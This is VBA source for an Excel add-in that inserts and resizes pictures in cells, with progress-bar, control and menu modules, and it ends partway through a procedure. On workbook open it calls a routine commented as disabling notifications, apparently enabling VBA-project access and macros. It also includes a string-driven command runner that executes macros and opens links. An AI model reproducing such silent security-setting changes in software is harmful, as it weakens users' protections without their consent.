' Module        : PictureProperties                    Version:
' Author        : Igor Vakhnenko                   Date: 14.10.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text

Public cell As Range, sha As Shape

Public WidthBefore As Single, HeightBefore As Single
Public WidthAfter As Single, HeightAfter As Single

Public FilesCount As Long, SelectedFile As String
Public PasteIntoRange As Boolean

Function LoadSizesFromImageFile(ByVal filename$) As Boolean
    On Error Resume Next
    Dim H As Single, w As Single
    LoadSizesFromImageFile = GetPictureSizeNew(filename$, w, H)
    Me.WidthBefore = w
    Me.HeightBefore = H
End Function

Sub CalculatePictureHeightAndWidth()
    On Error Resume Next: Err.Clear
    Dim w As Single, H As Single, p_w As Single, p_h As Single, ra_w!, ra_h!, wh!

    ra_w! = cell.Areas(1).Width
    ra_h! = cell.Areas(1).Height

    ' loading Settings
    Dim MaxPicHeight&, MaxPicWidth&, pad&, bLockAspectRatio As Boolean, bFixedImageHeight As Boolean, bFixedImageWidth As Boolean
    Dim bFixedRowHeight As Boolean, bAdjustRowHeight As Boolean, bImageWidthLessThanColumnWidth As Boolean

    MaxPicHeight& = Val(SETT.GetNumber("SpinButton_H", 60))
    MaxPicWidth& = Val(SETT.GetNumber("SpinButton_W", 85))
    pad& = SETT.GetNumber("ComboBox_Padding")
    bLockAspectRatio = SETT.GetBoolean("CheckBox_LockAspectRatio")
    bFixedImageHeight = SETT.GetBoolean("CheckBox_FixedImageHeight")
    bFixedImageWidth = SETT.GetBoolean("CheckBox_FixedImageWidth")

    bFixedRowHeight = SETT.GetBoolean("CheckBox_FixedRowHeight")
    bAdjustRowHeight = SETT.GetBoolean("CheckBox_AdjustRowHeight")
    'bResizeImageToColumnWidth = SETT.GetBoolean("CheckBox_ResizeImageToColumnWidth")
    bImageWidthLessThanColumnWidth = SETT.GetBoolean("CheckBox_ImageWidthLessThanColumnWidth")


    If Not bAdjustRowHeight Then
        MaxPicHeight& = Application.Max(Application.Min(ra_h! - 2 * pad&, MaxPicHeight&), 1)
    End If
    If Not bImageWidthLessThanColumnWidth Then
        MaxPicWidth& = Application.Max(Application.Min(ra_w! - 2 * pad&, MaxPicWidth&), 1)
    End If

    If PasteIntoRange Then
        MaxPicHeight& = ra_h! - 2 * pad
        MaxPicWidth& = ra_w! - 2 * pad
    End If

    wh! = Me.WidthBefore / Me.HeightBefore

    Select Case True
        Case bFixedImageWidth And bFixedImageHeight
            H = MaxPicHeight&
            w = MaxPicWidth&

        Case bLockAspectRatio And bFixedImageHeight
            H = MaxPicHeight&
            w = H * wh!

        Case bLockAspectRatio And bFixedImageWidth
            w = MaxPicWidth&
            H = w / wh!

        Case bLockAspectRatio
            w = Me.WidthBefore
            H = Me.HeightBefore
            If H > 408 - 2 * pad Then
                H = 408 - 2 * pad
                w = H * wh!
            End If
            ' If PasteIntoRange And cell.Count > 1 Then
            H = MaxPicHeight&: w = H * wh!
            If w > MaxPicWidth& Then w = MaxPicWidth&: H = w / wh!
            ' End If


        Case bFixedImageHeight
            H = MaxPicHeight&
            w = Me.WidthBefore

        Case bFixedImageWidth
            w = MaxPicWidth&
            H = Me.HeightBefore
            If H > 408 - 2 * pad Then H = 408 - 2 * pad

        Case Else
            H = MaxPicHeight&
            w = MaxPicWidth&

    End Select

    Me.WidthAfter = w: Me.HeightAfter = H
End Sub

Sub ResizeAndMovePicture(ByRef sha_ As Shape)
    On Error Resume Next: Err.Clear
    Dim pad&, aww, dpb, NewHeight!
    Set sha = sha_
    pad& = SETT.GetNumber("ComboBox_Padding")
    sha.LockAspectRatio = msoFalse

    aww = ActiveWindow.View: dpb = cell.Worksheet.DisplayPageBreaks
    If ActiveWindow.View <> xlNormalView Then ActiveWindow.View = xlNormalView
    If cell.Worksheet.DisplayPageBreaks Then cell.Worksheet.DisplayPageBreaks = False

    If SETT.GetBoolean("CheckBox_AdjustRowHeight") Then
        If cell.Rows.Count = 1 Then
            If cell.RowHeight < (Me.HeightAfter + 2 * pad&) Then cell.RowHeight = (Me.HeightAfter + 2 * pad&)      '* 3 / 4
        Else
            NewHeight = (Me.HeightAfter + 2 * pad&) / cell.Rows.Count
            If cell.EntireRow.Height < (Me.HeightAfter + 2 * pad&) Then cell.EntireRow.RowHeight = NewHeight
        End If
    End If
    MoveShape sha
    sha.Placement = Val(SETT.GetNumber("ComboBox_Placement", 1))

    If ActiveWindow.View <> aww Then ActiveWindow.View = aww
    If dpb Then cell.Worksheet.DisplayPageBreaks = dpb
End Sub

Sub MoveShape(ByRef sha_ As Shape)
    On Error Resume Next: Err.Clear
    Set sha = sha_
    Dim pad&: pad& = SETT.GetNumber("ComboBox_Padding")

    Select Case SETT.GetNumber("TextBox_PicturePosition")

        Case fmPicturePositionLeftTop
            sha.Top = cell.Top + pad&
            sha.Left = cell.Left + pad&

        Case fmPicturePositionLeftCenter
            sha.Left = cell.Left + pad&
            sha.Top = cell.Top + (cell.Height - sha.Height) / 2

        Case fmPicturePositionLeftBottom
            sha.Left = cell.Left + pad&
            sha.Top = cell.Top + (cell.Height - sha.Height) - pad&

        Case fmPicturePositionRightTop
            sha.Top = cell.Top + pad&
            sha.Left = cell.Left + cell.Width - sha.Width - pad&

        Case fmPicturePositionRightCenter
            sha.Top = cell.Top + (cell.Height - sha.Height) / 2
            sha.Left = cell.Left + cell.Width - sha.Width - pad&

        Case fmPicturePositionRightBottom
            sha.Top = cell.Top + (cell.Height - sha.Height) - pad&
            sha.Left = cell.Left + cell.Width - sha.Width - pad&

        Case fmPicturePositionAboveCenter
            sha.Top = cell.Top + pad&
            sha.Left = cell.Left + (cell.Width - sha.Width) / 2

        Case fmPicturePositionBelowCenter
            sha.Top = cell.Top + (cell.Height - sha.Height) - pad&
            sha.Left = cell.Left + (cell.Width - sha.Width) / 2

        Case fmPicturePositionCenter
            sha.Top = cell.Top + (cell.Height - sha.Height) / 2
            sha.Left = cell.Left + (cell.Width - sha.Width) / 2

    End Select
End Sub

Function SizeBefore$()
    If WidthBefore * HeightBefore Then SizeBefore$ = WidthBefore & " * " & HeightBefore
End Function
Function SizeAfter$()
    If WidthAfter * HeightAfter Then SizeAfter$ = WidthAfter & " * " & HeightAfter
End Function

Sub FillInfoIntoRow()
    On Error Resume Next: Err.Clear: Dim col&
    If cell Is Nothing Then Exit Sub

    If SETT.GetBoolean("CheckBox_Add_ImageSizeOriginal") Then
        col& = Fix(Val(SETT.GetNumber("ComboBox_ImageSizeOriginalColumn")))
        If col& Then cell.EntireRow.Cells(col&) = SizeBefore$
    End If

    If SETT.GetBoolean("CheckBox_Add_ImageSizeNew") Then
        col& = Fix(Val(SETT.GetNumber("ComboBox_ImageSizeNewColumn")))
        If col& Then cell.EntireRow.Cells(col&) = SizeAfter$
    End If

    If SETT.GetBoolean("CheckBox_Add_ImagesCount") Then
        col& = Fix(Val(SETT.GetNumber("ComboBox_ImagesCountColumn")))
        If col& Then cell.EntireRow.Cells(col&) = FilesCount
    End If
    
    If SETT.GetBoolean("CheckBox_Add_ImageFilename") Then
        col& = Fix(Val(SETT.GetNumber("ComboBox_ImageFilenameColumn")))
        If col& Then cell.EntireRow.Cells(col&) = Me.SelectedFile
    End If
End Sub
Attribute VB_Name = "ProgressIndicator"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ProgressIndicator                    Version: 2
' Author        : Igor Vakhnenko                   Date: 21.07.2015
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit

Public FP As New F_Progress
Public SubActionIndex As Single, SubActionsCount As Single, SubActionsStep&
Private FPVisible As Boolean, FPStartTime As Date, Position&
Private PrS&, PrE&, Percent As Double, LogString$

Public Parent As ProgressIndicator, Children As New Collection
Public ShowPercents As Boolean, ShowTime As Boolean, ShowTimeInLog As Boolean

Dim MSG_EstimatedTime$, BTN_Stop$

Function AddChildIndicator(ByVal Caption$, Optional ByVal FPPosition& = 1) As ProgressIndicator
    On Error Resume Next
    Set AddChildIndicator = New ProgressIndicator
    Set AddChildIndicator.Parent = Me
    AddChildIndicator.Show Caption, FPPosition
    Children.Add AddChildIndicator
End Function

Private Sub Class_Initialize()
    Set FP = New F_Progress: ShowPercents = True: FPVisible = True
    PrS = 0: PrE = 100: Set_ProgressBar 0: FP.PrBar.Caption = ""
    FPStartTime = Now: ShowTime = True: ShowPercents = True: SubActionsStep = 1
    Set FP.Indicator = Me

    On Error Resume Next
    MSG_EstimatedTime$ = Run(TWN & "tt", "PI_MSG_EstimatedTime")
    If MSG_EstimatedTime$ = "" Then MSG_EstimatedTime$ = "Estimated time left"
    BTN_Stop$ = Run(TWN & "tt", "PI_BTN_Cancel")
    If BTN_Stop$ = "" Then BTN_Stop$ = "Cancel"
    FP.CommandButton_stop.Caption = BTN_Stop$
    Err.Clear
End Sub

Sub Show(ByVal Caption$, Optional ByVal FPPosition& = 0, Optional LogSize& = 0)
    On Error Resume Next
    SetProgressFormCaption Caption: On Error Resume Next:
    FP.PrBar.Width = ProgressBar_Default_Width
    Position = FPPosition
    FP.Tag = Caption: FP.Show:
    If Position <> 0 Then Move Position
    FP.Repaint: DoEvents
    FP.SpinButton_log.Value = LogSize
    FP.SpinButton_log.Visible = LogSize > 0
    SetLogSize LogSize
End Sub

Sub Hide()
    Unload FP
    FPVisible = False
End Sub

Sub Repaint()
    FP.Repaint: DoEvents
    'If Application.ScreenUpdating = False Then Application.ScreenUpdating = True: Application.ScreenUpdating = False
End Sub

Sub Move(ByVal Position&)
    If Abs(Position) > 3 Then Exit Sub
    If Not Me.Parent Is Nothing Then
        FP.Top = Me.Parent.FP.Top + Me.Parent.FP.Height + 10 + (FP.Height + 3) * (Position - 1)
    Else
        FP.Top = FP.Top + (FP.Height + 3) * Position
    End If
End Sub

Public Property Get Visible(): Visible = FPVisible: End Property

Public Property Let Line1(ByVal NewValue$): FP.L1.Caption = ProcessLabel(NewValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let Line2(ByVal NewValue$): FP.L2.Caption = ProcessLabel(NewValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let Line3(ByVal NewValue$): FP.L3.Caption = ProcessLabel(NewValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let Caption(ByVal NewValue$): SetProgressFormCaption NewValue: End Property

Private Sub SetProgressFormCaption(Optional ByVal Caption$ = "")
    Dim txt$, dt$
    If Len(Caption) > 0 Then FP.Tag = Caption
    txt = Trim(FP.Tag): If ShowPercents Then txt = Fix(Percent) & " %   " & txt
    dt = Format(Now - FPStartTime, "HH:NN:SS")
    If ShowTime Then txt = "( " & dt & " )    " & txt
    FP.Caption = txt
End Sub

Private Function TimeToFinish$()
    On Error Resume Next: Dim dt As Single
    If Percent < 15 Then Exit Function
    dt = (Now - FPStartTime) * (100 - Percent) / Percent
    TimeToFinish$ = Format(dt, "H:NN:SS")
    TimeToFinish$ = MSG_EstimatedTime$ & ": " & TimeToFinish$
End Function

Sub SetFocus()
    FP.Show 0: If Position <> 0 Then Move Position
End Sub

Private Sub UpdateLabels(Optional ByVal L1_txt$, Optional ByVal L2_txt$, Optional ByVal L3_txt$)
    If Len(L1_txt$) > 0 Then FP.L1.Caption = ProcessLabel(L1_txt$)
    If Len(L1_txt$) + Len(L2_txt$) > 0 Then FP.L2.Caption = ProcessLabel(L2_txt$)
    If Len(L1_txt$) + Len(L2_txt$) + Len(L3_txt$) > 0 Then FP.L3.Caption = ProcessLabel(L3_txt$)
End Sub

Private Function ProcessLabel$(ByVal txt$)
    If txt Like "*$index*" Then txt = Replace(txt, "$index", SubActionIndex)
    If txt Like "*$count*" Then txt = Replace(txt, "$count", SubActionsCount)
    If txt Like "*$time*" Then txt = Replace(txt, "$time", TimeToFinish)
    ProcessLabel = txt
End Function

Sub SubAction(Optional ByVal L1_txt$ = "", Optional ByVal L2_txt$ = "", Optional ByVal L3_txt$ = "")
    On Error Resume Next
    If SubActionsCount = 0 Then SubActionsCount = 1
    SubActionIndex = SubActionIndex + 1 * SubActionsStep
    If SubActionIndex > SubActionsCount Then SubActionIndex = SubActionsCount
    Percent = PrS + (PrE - PrS) * ((SubActionIndex - 1) / SubActionsCount)
    UpdateLabels L1_txt$, L2_txt$, L3_txt$
    Set_ProgressBar Percent: DoEvents
End Sub

Sub StartNewAction(Optional ByVal Pr_Start& = 0, Optional ByVal Pr_End& = 100, _
                   Optional ByVal L1_txt$ = "", Optional ByVal L2_txt$ = " ", Optional ByVal L3_txt$ = " ", _
                   Optional ByVal Actions_Count& = 0)
    On Error Resume Next
    PrS = Pr_Start: PrE = Pr_End: SubActionIndex = 0: SubActionsCount = Actions_Count
    UpdateLabels L1_txt$, L2_txt$, L3_txt$
    Set_ProgressBar PrS
End Sub

Sub UpdateFromChild(ByVal ChildPercent As Double)
    If SubActionsCount = 0 Then
        Percent = PrS + (PrE - PrS) * (ChildPercent / 100)
    Else
        Percent = PrS + (PrE - PrS) / SubActionsCount * (SubActionIndex - 1) + (PrE - PrS) / SubActionsCount * (ChildPercent / 100)
    End If
    Set_ProgressBar Percent
End Sub

Private Sub Set_ProgressBar(ByVal NewPercent As Double)
    On Error Resume Next: Percent = NewPercent
    If NewPercent > 100 Then Percent = 100
    If NewPercent < 0 Then Percent = 0
    FP.PrBar.Width = Int(Percent * ProgressBar_Default_Width / 100)
    SetProgressFormCaption
    FP.Repaint
    If Not Parent Is Nothing Then Parent.UpdateFromChild Percent
End Sub

Private Sub Class_Terminate()
    On Error Resume Next
    Unload FP: FPVisible = False
    Set FP = Nothing: Set Children = Nothing: Set Parent = Nothing
End Sub

Private Function ProgressBar_Default_Width() As Double
    ProgressBar_Default_Width = FP.Width - 18
End Function

Function CancelButton() As MSForms.CommandButton
    Set CancelButton = FP.CommandButton_stop
End Function

Sub SetLogSize(ByVal n&)
    On Error Resume Next
    If n < 0 Then n = 0
    If n > 5 Then n = 5
    FP.SpinButton_log.Value = n
    FP.SpinButton_log.Visible = n > 0
End Sub

Sub Log(ByVal txt$, Optional ByVal MaxLen& = 0)
    On Error Resume Next: Dim currtime$, newtext$
    If ShowTimeInLog Then currtime$ = Time & vbTab
    LogString = LogString & vbNewLine & currtime$ & txt
    newtext$ = Mid(LogString, 3): If MaxLen& Then newtext$ = Right(newtext$, MaxLen&)
    FP.TextBox_Log.text = newtext$
    If FP.SpinButton_log.Value = 0 Then FP.SpinButton_log.Value = 2: FP.SpinButton_log.Visible = True
    FP.CommandButton_stop.SetFocus: FP.TextBox_Log.SetFocus
End Sub

Sub ClearLog()
    LogString = "": FP.TextBox_Log.text = ""
End Sub

Sub ShowLog()
    On Error Resume Next: Dim filename$
    filename$ = Environ("TEMP") & "\macro_log.txt"
    With CreateObject("scripting.filesystemobject").CreateTextFile(filename, True)
        .Write Mid(LogString, 3): .Close
    End With
    FollowHyperlink """" & filename$ & """"
End Sub

Sub AddButton(ByVal Caption$, ByVal Macro$)
    Const dd& = 18
    If FP.SpinButton_log = 0 Then FP.SpinButton_log = 1
    With Me.FP.CommandButton_RunMacro
        .Caption = Caption$
        .Visible = True
        .Top = FP.Height - .Height - dd - 20
        .Left = FP.Width - .Width - dd - 15
    End With
    FP.ButtonMacro = Macro$
End Sub

Function MacroButton() As MSForms.CommandButton
    Set MacroButton = FP.CommandButton_RunMacro
End Function

Sub QueryClose()
    On Error Resume Next
    Dim pi As ProgressIndicator
    For Each pi In Children
        pi.QueryClose
        pi.Hide
    Next pi
End Sub


Attribute VB_Name = "SpecialControl"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : SpecialControl                    Version:
' Author        : Igor Vakhnenko                   Date: 05.07.2015
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text
Public WithEvents Scroller As MSForms.ScrollBar
Attribute Scroller.VB_VarHelpID = -1
Public WithEvents ScrolledCombo As MSForms.ComboBox
Attribute ScrolledCombo.VB_VarHelpID = -1
Dim ScrollEventEnabled As Boolean

Public WithEvents MainCheckboxInFrame As MSForms.CheckBox
Attribute MainCheckboxInFrame.VB_VarHelpID = -1
'Public WithEvents FontSelectCombo As MSForms.ComboBox
Public WithEvents ColorSelectCombo As MSForms.ComboBox
Attribute ColorSelectCombo.VB_VarHelpID = -1
Public WithEvents KeyNameTexbox As MSForms.TextBox
Attribute KeyNameTexbox.VB_VarHelpID = -1
Public WithEvents NumericTexbox As MSForms.TextBox
Attribute NumericTexbox.VB_VarHelpID = -1

Private Sub NumericTexbox_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
    On Error Resume Next
    Select Case KeyAscii
        Case 48 To 57, 8
        Case Else: KeyAscii = 0
    End Select
End Sub

' -----------------------------------------------------------------------------------

'Private Sub FontSelectCombo_Change()
'    On Error Resume Next: Me.FontSelectCombo.SelStart = 1
'    With New FontParameters
'        .LoadFromText (Me.FontSelectCombo)
'        .ApplyToSettingsField Me.FontSelectCombo
'    End With
'    Me.FontSelectCombo.SelStart = 1
'End Sub
'
'Private Sub FontSelectCombo_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
'    On Error Resume Next: Me.FontSelectCombo.SelStart = 1
'    With New FontParameters
'        .LoadFromText (Me.FontSelectCombo): .PickNewFont
'        Me.FontSelectCombo = .ExportToText
'
'        Dim UF As Object: Set UF = Me.FontSelectCombo
'        While TypeName(UF) <> "UserForm": Set UF = UF.Parent: Wend
'        UF.Show
'    End With
'    Me.FontSelectCombo.SelStart = 1
'End Sub

' -----------------------------------------------------------------------------------
'Private Sub KeyNameTexbox_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
'    KeyAscii = 0
'End Sub
'Private Sub KeyNameTexbox_KeyUp(ByVal KeyCode As MSForms.ReturnInteger, ByVal Shift As Integer)
'    On Error Resume Next: Button$ = GetKeyName(KeyCode, Shift)
'    If Len(Button$) Then KeyCode = 0: Me.KeyNameTexbox = Button$
'End Sub
' -----------------------------------------------------------------------------------
'Private Sub ColorSelectCombo_Change()
'    On Error Resume Next: clr& = Val(Me.ColorSelectCombo)
'    If clr& >= 0 Then
'        Me.ColorSelectCombo.ForeColor = clr&: Me.ColorSelectCombo.BackColor = clr&
'    Else
'         clr& = vbButtonFace
'        Me.ColorSelectCombo.ForeColor = clr&: Me.ColorSelectCombo.BackColor = clr&
'    End If
'End Sub
'
'Private Sub ColorSelectCombo_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal y As Single)
'    On Error Resume Next: clr& = PickNewColor(IIf(Me.ColorSelectCombo = "", xlNone, Val(Me.ColorSelectCombo)))
'    Me.ColorSelectCombo = clr&
'End Sub

' -----------------------------------------------------------------------------------
Private Sub MainCheckboxInFrame_Change()
    On Error Resume Next: Err.Clear
    Dim fr As MSForms.Frame, ctrl As MSForms.Control: Set fr = Me.MainCheckboxInFrame.Parent
    If Err <> 0 Or (fr Is Nothing) Then MsgBox "MainCheckboxInFrame.Parent is not frame control": Exit Sub
    For Each ctrl In fr.Controls
        If ctrl.name <> Me.MainCheckboxInFrame.name Then
            ctrl.Enabled = Me.MainCheckboxInFrame.Value
        End If
    Next
End Sub
' -----------------------------------------------------------------------------------
Function FieldFound() As Boolean
    On Error Resume Next
    If Not ScrolledCombo Is Nothing Then FieldFound = True: Exit Function
    ScrollEventEnabled = False: Me.Scroller.Value = 1: ScrollEventEnabled = True
    Dim ctrl As MSForms.Control
    For Each ctrl In Me.Scroller.Parent.Controls
        If TypeName(ctrl) = "ComboBox" Then
            If ctrl.Top < Scroller.Top And ctrl.Left < Scroller.Left And _
               ctrl.Top + ctrl.Height > Scroller.Top + Scroller.Height And ctrl.Left + ctrl.Width > Scroller.Left + Scroller.Width Then
                Set ScrolledCombo = ctrl
                FieldFound = True: Exit Function
            End If
        End If
    Next
    MsgBox "Combo not found", , Me.Scroller.name
End Function

Private Sub Scroller_Change()
    On Error Resume Next: If Not Me.FieldFound Then Exit Sub
    If Not ScrollEventEnabled Then Exit Sub
    Select Case Me.Scroller.Value
        Case 0: Me.ScrolledCombo.ListIndex = Me.ScrolledCombo.ListIndex + 1
        Case 2: If Me.ScrolledCombo.ListIndex > 0 Then Me.ScrolledCombo.ListIndex = Me.ScrolledCombo.ListIndex - 1
    End Select
    ScrollEventEnabled = False: Me.Scroller.Value = 1: ScrollEventEnabled = True
End Sub

Attribute VB_Name = "ThisWB"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
'---------------------------------------------------------------------------------------
' Author        : Igor Vakhnenko                   Date: 25.12.2015
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit

Private Sub Workbook_BeforeClose(Cancel As Boolean)
    On Error Resume Next
    If Not Developer Then ThisWorkbook.Saved = True
    Application.OnKey "^r", ""

    DeleteProgramCommandBar
End Sub

Private Sub Workbook_Open()
    On Error Resume Next: Dim FirstRun As Boolean
    FirstRun = SETT.IsFirstRun
    If FirstRun Then ShowFirstRunForm
    If SetupCancelled Then
        Application.DisplayAlerts = False
        If TrueDeveloper Then MsgBox "Setup Cancelled", vbInformation Else ThisWorkbook.Close False
        Application.DisplayAlerts = True
        Exit Sub
    End If
    Enable_AccessVBOM_Macro_DataConnections        ' disables notifications
    SaveSetting PROJECT_NAME$, "Setup", "AddinPath", ThisWorkbook.FullName
    Application.OnKey "^r", "ReplacePictiresInSelectedRows"
    CreateProgramCommandBar 0
End Sub
Attribute VB_Name = "mod_About_NEW"
'---------------------------------------------------------------------------------------
' Module        : mod_About_NEW                    Version: 2.51
' Author        : Igor Vakhnenko                   Date: 09.05.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module
Public Const DEBUG_MODE As Boolean = False        'True
Public Const UPDATES_HYPERLINK$ = "http://localhost"

Public Const DEVELOPER_WEBSITE$ = "https://ExcelVBA.ru/"
Public Const SUPPORT_EMAIL_RUS$ = "info@ExcelVBA.ru", SUPPORT_EMAIL$ = "info@ExcelVBA.ru"
Public Const BUY_NEW_HYPERLINK$ = "%website%buy/add-in?name=%projectname%"
Public Const BUY_ADD_HYPERLINK$ = "%website%buy2/add-in?name=%projectname%"
Public Const UNINSTALL_HYPERLINK$ = "%website%uninstall/program?name=%projectname%"
Public Const EULA_HYPERLINK$ = "%website%buy/EULA?name=%projectname%"
Public Const BREACH_EULA_HYPERLINK$ = "http://localhost"
Public Const CABINET_HYPERLINK$ = "%website%cabinet/login"
Public Const VERSIONS_HISTORY_HYPERLINK$ = "%website%updates/history.php?addin=%projectname%"
Public SetupCancelled As Boolean, StopMacro As Boolean

Public Const CFA_NAME$ = "'CommonFunctions.xla'!"
Public Enum CONTROL_TYPES
    ct_BUTTON = msoControlButton: ct_TEXTBOX = msoControlEdit: ct_COMBOBOX = msoControlComboBox
    ct_DROPDOWN = msoControlDropdown: ct_POPUP = msoControlPopup
End Enum

#If Win64 Then
    Private Declare PtrSafe Function AccessibleChildren Lib "oleacc.dll" (ByVal paccContainer As Object, ByVal iChildStart As Long, ByVal cChildren As Long, rgvarChildren As Variant, pcObtained As LongPtr) As LongPtr
#Else
    Private Declare Function AccessibleChildren Lib "oleacc.dll" (ByVal paccContainer As Object, ByVal iChildStart As Long, ByVal cChildren As Long, rgvarChildren As Variant, pcObtained As Long) As Long
#End If

Sub ActivateAddinsTab()
    On Error Resume Next: Dim TabName$
    Select Case Application.LanguageSettings.LanguageID(msoLanguageIDUI)
        Case 1049: TabName$ = SETT.U("CDE0E4F1F2F0EEE9EAE8")        '"|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 1033: TabName$ = "Add-Ins"
    End Select
    If Len(TabName$) Then SwitchTab TabName$
End Sub


Sub Add3Buttons(ByRef AddinMenu As Object)
    Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
    Add_Control AddinMenu, ct_BUTTON, 222, "ShowSettingsPage", tt("MENU_Settings") & "  ", msoButtonIconAndCaption, True
    Add_Control AddinMenu, ct_BUTTON, 487, "ShowMainForm", tt("MENU_About") & "  ", msoButtonIconAndCaption, True
    Add_Control AddinMenu, ct_BUTTON, IIf(Val(Application.Version) <= 11, 4356, 923), "ExitProgram", tt("MENU_Exit"), msoButtonIcon, True
End Sub

Function Add_Control(ByRef Comm_Bar, ByVal ControlType As CONTROL_TYPES, Optional ByVal B_Face&, Optional ByVal On_Action$, _
                     Optional ByVal B_Caption$, Optional ByVal Button_Style As Long = msoButtonIcon, _
                     Optional ByVal Begin_Group As Boolean = False, Optional Tag = "") As CommandBarControl
    On Error Resume Next
    Set Add_Control = Comm_Bar.Controls.Add(Type:=ControlType, Temporary:=True)
    With Add_Control
        If B_Face > 0 And ControlType = ct_BUTTON Then .FaceId = B_Face
        If Len(On_Action) Then
            .Tag = TWN & On_Action & "\\\" & Tag
            .OnAction = TWN & "RunMacroFromButton": If On_Action Like "Exit*" Then .OnAction = TWN & On_Action
        End If
        .Caption = B_Caption
        .BeginGroup = Begin_Group
        If ControlType = ct_BUTTON Or ControlType = ct_DROPDOWN Then .Style = Button_Style
    End With
End Function

Private Sub RunMacroFromButton()
    On Error Resume Next: Dim Macro$, param$
    Macro$ = Split(Application.CommandBars.ActionControl.Tag, "\\\")(0)
    param$ = Split(Application.CommandBars.ActionControl.Tag, "\\\")(1)
    If Macro$ Like TWN & "*" Then SETT.LastMacro Macro$
    If Len(Macro$) > O Then If Len(param$) Then Run Macro$, param$ Else Run Macro$
End Sub

Function GetCommandBar(ByVal CommandBarName As String, Optional ByVal Clean As Boolean = False, _
                       Optional ByVal Position As MsoBarPosition = msoBarTop) As CommandBar
    On Error Resume Next: Err.Clear: Dim cbc As Object
    Set GetCommandBar = Application.CommandBars(CommandBarName)
    If Err.Number Then
        Set GetCommandBar = Application.CommandBars.Add(CommandBarName, Position, False, True)
    End If
    If Clean Then
        GetCommandBar.Visible = False
        For Each cbc In GetCommandBar.Controls: cbc.Delete: Next
    End If
    GetCommandBar.Visible = True
End Function

Function EXECUTE_COMMANDS(ByVal txt$, Optional ShowErrMsg As Boolean)
    On Error Resume Next
    Dim commands, i&, cmd$, arr, j&, settname$, settval$, section$, msgboxStyle As VbMsgBoxStyle, macroname$, msg$, ER&
    commands = Split(txt$, "ll")
    For i = LBound(commands) To UBound(commands)
        cmd$ = "": arr = "": cmd$ = cmdDisplay$(commands(i))
        arr = Split(cmd$, " ")
        For j = LBound(arr) To UBound(arr): arr(j) = Replace(arr(j), "%20", " "): Next j
        Select Case arr(0)
            Case "SET"
                If UBound(arr) >= 3 Then
                    section$ = arr(1): settname$ = arr(2): settval$ = Replace(Split(cmd$, " ", 4)(3), "%20", " ")
                    If settval$ = "now" Then settval$ = Now
                    If Len(settname$) Then SETT.SetText settname$, settval$, IIf(Len(section$), section$, "Settings")
                End If
            Case "SETH"
                Dim ind&, params$: params$ = Split(cmd$, " ", 2)(1)
                If params$ Like "*#=*" Then
                    ind& = Val(Split(params$, "=", 2)(0))
                    If ind > 0 Then SETT.WSP ind&, Split(params$, "=", 2)(1)
                End If
            Case "RUN"
                macroname$ = "'" & ThisWorkbook.name & "'!" & arr(1)
                Select Case UBound(arr)
                    Case 1: Run macroname$
                    Case 2: Run macroname$, arr(2)
                    Case 3: Run macroname$, arr(2), arr(3)
                    Case 4: Run macroname$, arr(2), arr(3), arr(4)
                End Select
            Case "SH"
                FollowHyperlink arr(1)
            Case "MSG", "MSGE", "MSGI", "MSGW", "MSGC"
                msgboxStyle = vbInformation
                If arr(0) = "MSGE" Then msgboxStyle = vbExclamation
                If arr(0) = "MSGW" Or arr(0) = "MSGC" Then msgboxStyle = vbCritical
                msg$ = "": msg$ = Replace(Split(cmd$, " ", 2)(1), "/n", vbNewLine)
                If Len(msg) Then MsgBox msg, msgboxStyle
            Case "MSGA"
                MsgBox tt("MSG_activation_done"), vbInformation
                F_About.MultiPage1.Value = 0
            Case "MSGR": F_About.MultiPage1.Value = 0
            Case Else: ER& = ER& + 1        ' unsupported command
        End Select
        ER& = ER& - (UBound(arr) = -1)
    Next i
    If ShowErrMsg Then If UBound(commands) + 1 = ER& Then MsgBox "Unsupported code", vbCritical
End Function

Function DeleteProgramCommandBar()
    On Error Resume Next: GetCommandBar(PROJECT_NAME).Visible = False
End Function

Function SetIsAddinAsFalse()
    On Error Resume Next: ThisWorkbook.IsAddin = False
End Function
Function SetIsAddinAsTrue()
    On Error Resume Next: ThisWorkbook.IsAddin = True
End Function

Function SETT() As AddinSettings
    Static objSETT As AddinSettings
    If objSETT Is Nothing Then Set objSETT = New AddinSettings: objSETT.LoadAllSettings
    Set SETT = objSETT
End Function

Private Sub ShowMainForm()
    On Error Resume Next: F_About.Show
